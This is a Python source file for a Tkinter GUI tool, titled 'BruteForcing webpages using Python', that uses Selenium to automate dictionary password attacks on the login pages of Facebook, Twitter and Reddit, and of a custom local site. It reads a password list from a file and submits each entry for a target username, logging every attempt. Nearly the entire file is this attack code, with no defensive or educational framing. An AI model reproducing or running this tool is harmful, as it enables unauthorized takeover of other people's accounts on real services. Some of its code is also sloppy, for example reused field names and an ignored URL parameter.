from tkinter import font
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
import tkinter
import time
from tkinter import *
from tkinter import ttk
from tkinter import filedialog
import selenium
from selenium import webdriver
from selenium.webdriver.firefox.webdriver import WebDriver
# Using Chrome to access web
# Open the website
CHROME_DVR_DIR = 'C:\webdrivers\chromedriver.exe'
#driver = webdriver.Chrome(CHROME_DVR_DIR)
#----------------------------
def strt():
    t.config(state=NORMAL)
    t.delete(1.0,END)
    t.insert("end","Starting : email/username:"+em.get()+"\n")
    t.config(state=DISABLED)
    passwd_list=None
    def callfb(passwd_list,u_det,wurl):
        optionss = webdriver.ChromeOptions()
        optionss.add_argument("--disable-popup-blocking")
        optionss.add_argument("--disable-extensions")
        browser = webdriver.Chrome(CHROME_DVR_DIR)
        browser.get(w_url)
        id_box_email = browser.find_element_by_name('email')
        id_box_pass = browser.find_element_by_name('pass')
        id_box_email.send_keys(u_det)
        id_box_pass .send_keys('intentionallywrong')
        login_button = browser.find_element_by_name('login')
        login_button.click()
        browser.implicitly_wait(15)
        for passwd in passwd_list:
            passwd= passwd.decode("utf-8").rstrip()
            print(passwd)
            id_box_pass = browser.find_element_by_name('pass')
            id_box_pass.send_keys(passwd)
            login_button = browser.find_element_by_name('login')
            login_button.click()
            #time.sleep(4)
            browser.implicitly_wait(15)
            t.config(state=NORMAL)
            t.insert("end","Tried : "+passwd+"\n")
            t.config(state=DISABLED)

  
    def calltw(passwd_list,u_det,wurl):
        optionss = webdriver.ChromeOptions()
        optionss.add_argument("--disable-popup-blocking")
        optionss.add_argument("--disable-extensions")
        browser = webdriver.Chrome(CHROME_DVR_DIR)
        browser.get(w_url)
        id_box_email = browser.find_element_by_name('session[username_or_email]')
        id_box_pass = browser.find_element_by_name('session[password]')
        id_box_email.send_keys(u_det)
        id_box_pass .send_keys('intentionallywrong')
        login_button = browser.find_element_by_xpath('//*[@id="react-root"]/div/div/div[2]/main/div/div/div[2]/form/div/div[3]/div/div')
        login_button.click()
        browser.implicitly_wait(15)
        for passwd in passwd_list:
            passwd= passwd.decode("utf-8").rstrip()
            print(passwd)
            id_box_pass = browser.find_element_by_name('pass')
            id_box_pass.send_keys(passwd)
            login_button = browser.find_element_by_name('login')
            login_button.click()
            #time.sleep(4)
            browser.implicitly_wait(15)
            t.config(state=NORMAL)
            t.insert("end","Tried : "+passwd+"\n")
            t.config(state=DISABLED)

    def callrd(passwd_list,u_det,wurl):
        optionss = webdriver.ChromeOptions()
        optionss.add_argument("--disable-popup-blocking")
        optionss.add_argument("--disable-extensions")
        browser = webdriver.Chrome(CHROME_DVR_DIR)
        browser.get(w_url)
        id_box_email = browser.find_element_by_name('username')
        id_box_pass = browser.find_element_by_name('password')
        id_box_email.send_keys(u_det)
        id_box_pass .send_keys('intentionallywrong')
        login_button = browser.find_element_by_class_name('AnimatedForm__submitButton')
        login_button.click()
        browser.implicitly_wait(15)
        time.sleep(3)
        for passwd in passwd_list:
            passwd= passwd.decode("utf-8").rstrip()
            print(passwd)
            browser.get(w_url)
            id_box_email = browser.find_element_by_name('username')
            id_box_pass = browser.find_element_by_name('password')
            id_box_email.send_keys(u_det)
            id_box_pass.send_keys(passwd)
            login_button = browser.find_element_by_class_name('AnimatedForm__submitButton')
            time.sleep(4)
            login_button.click()
            browser.implicitly_wait(15)
            t.config(state=NORMAL)
            t.insert("end","Tried : "+passwd+"\n")
            t.config(state=DISABLED)

    def callcu(passwd_list,u_det,wurl):
        print(passwd_list,wurl,u_det)
        optionss = webdriver.ChromeOptions()
        optionss.add_argument("--disable-popup-blocking")
        optionss.add_argument("--disable-extensions")
        browser = webdriver.Chrome(CHROME_DVR_DIR)
        browser.get(w_url)
        id_box_email = browser.find_element_by_name('email')
        id_box_pass = browser.find_element_by_name('password')
        id_box_email.send_keys(u_det)
        id_box_pass .send_keys('passwd')
        login_button = browser.find_element_by_name('submit')
        login_button.click()
        browser.implicitly_wait(10)
        for passwd in passwd_list:
            passwd= passwd.decode("utf-8").rstrip()
            print(passwd)
            id_box_email = browser.find_element_by_name('email')
            id_box_pass = browser.find_element_by_name('password')
            id_box_email.send_keys(u_det)
            id_box_pass.send_keys(passwd)
            login_button = browser.find_element_by_name('submit')
            login_button.click()
            #time.sleep(1)
            browser.implicitly_wait(10)
            t.config(state=NORMAL)
            t.insert("end","Tried : "+passwd+", ")
            t.config(state=DISABLED)

    t.config(state=NORMAL)
    t.delete(1.0,END)
    t.insert("end","Starting : email/username:"+em.get()+"\n")
    t.config(state=DISABLED)
    w_url="null"
    u_det=em.get()
    inp=v2.get()
    inp2=v.get()
    if(inp==11):
        fo = open("passwd.txt","rb")
        passwd_list= fo.readlines()
        fo.close()
    else:
        pass
    if(inp2==1):
        w_url='https://www.facebook.com/'
        callfb(passwd_list,u_det,w_url)
    if(inp2==2):
        w_url='https://twitter.com/login'
        calltw(passwd_list,u_det,w_url)
    if(inp2==3):
        w_url='https://www.reddit.com/login/'
        callrd(passwd_list,u_det,w_url)
    if(inp2==4):
        w_url='http://127.0.0.1:8000/'
        callcu(passwd_list,u_det,w_url)

#----------------------------
master = tkinter.Tk()
#w = Canvas(master, width=620, height=400)
master.title("BruteForcing webpages using Python")
master.geometry("640x400") 
master.maxsize("640","400")
master.minsize("640","400")
v= IntVar(master,0)
v2= IntVar(master,0)
# https://www.tutorialspoint.com/python/tk_radiobutton.htm
rb=Radiobutton(master,text="Facebook",value="1",variable=v,font=('Aerial 10 bold'))
rb2=Radiobutton(master,text="Twitter",value="2",variable=v,font=('Aerial 10 bold'))
rb3=Radiobutton(master,text="Reddit",value="3",variable=v,font=('Aerial 10 bold'))
rb4=Radiobutton(master,text="Custom",value="4",variable=v,font=('Aerial 10 bold'))
rb.grid(row=1,column=0,sticky=W)
rb2.grid(row=1,column=1,sticky=W)
rb3.grid(row=1,column=2,sticky=W)
rb4.grid(row=1,column=3,sticky=W)
separator = ttk.Separator(master, orient='horizontal')
separator.place(relx=0, rely=0.18, relwidth=1, relheight=1)

separator2 = ttk.Separator(master, orient='horizontal')
separator2.place(relx=0, rely=0.35, relwidth=1, relheight=1)

separator3 = ttk.Separator(master, orient='horizontal')
separator3.place(relx=0, rely=0.45, relwidth=1, relheight=1)
#choosing the type of input

atype=Radiobutton(master,text="Inbuilt dictionary",value="11",variable=v2,font=('Aerial 10 bold'))
#atype2=Radiobutton(master,text="Upload your dictionary (.txt)",value="12",variable=v2,font=('Aerial 10 bold'))
#atype3=Radiobutton(master,text="Try all combinations",value="13",variable=v2,font=('Aerial 10 bold'))
atype.grid(row=3,columnspan=4)
#atype2.grid(row=3,column=1,sticky=W)
#atype3.grid(row=3,column=2,sticky=W)
#b=Button(master,text="Upload your file",command=upfile)
#b.grid(row=3,column=1)
#all labels
tkinter.Label(master,text="Enter username / email id",font=('Aerial 10 bold')).grid(row=4,column=0,sticky=E,pady=(10,10))
tkinter.Label(master,text="Choose website",font=('Aerial 10 bold'),bg="white").grid(row=0,column=0,columnspan=4,pady=(10,10))
tkinter.Label(master,text="choose password list input source",font=('Aerial 10 bold'),bg="white").grid(row=2,column=0,columnspan=4,pady=(10,10))
tkinter.Label(master,text="Status:",font=('Aerial 10 bold'),bg="white").grid(row=6,column=0,sticky=W,pady=(10,10))
#the textbox
em=StringVar(master,"null")
e1=Entry(master,textvariable=em)
e1.grid(row=4, column=1,sticky=W)


b=Button(master,text="Start",command=strt)
b.grid(row=5,columnspan=4,pady=(10,10))
#status
t=tkinter.Text(master,state="disabled")
t.grid(row=7,columnspan=4)
master.mainloop()